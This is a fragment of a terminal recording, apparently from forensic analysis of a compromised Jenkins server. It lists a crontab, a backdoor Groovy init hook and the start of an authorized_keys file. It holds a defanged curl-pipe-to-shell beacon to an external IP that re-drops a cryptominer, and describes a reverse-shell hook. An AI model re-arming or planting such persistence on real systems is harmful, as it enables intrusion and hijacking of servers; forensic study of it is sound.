[112.294875, "o", "==> /disk/var/spool/cron/crontabs/jenkins <==\r\n# m h dom mon dow user command\r\n0 3 * * * root /usr/local/bin/backup.sh\r\n30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\r\n*/15 * * * * nobody /usr/bin/check-health.sh\r\n# * * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload\r\n\r\n==> /disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy <==\r\n// z-backdoor.groovy\r\nimport jenkins.model.*\r\nJenkins init hook starts a Thread that calls execute() for a reverse shell to 198.51.100.98 (defanged)\r\n\r\n==> /disk/var/lib/jenkins/.ssh/authorized_keys <==\r\n"]
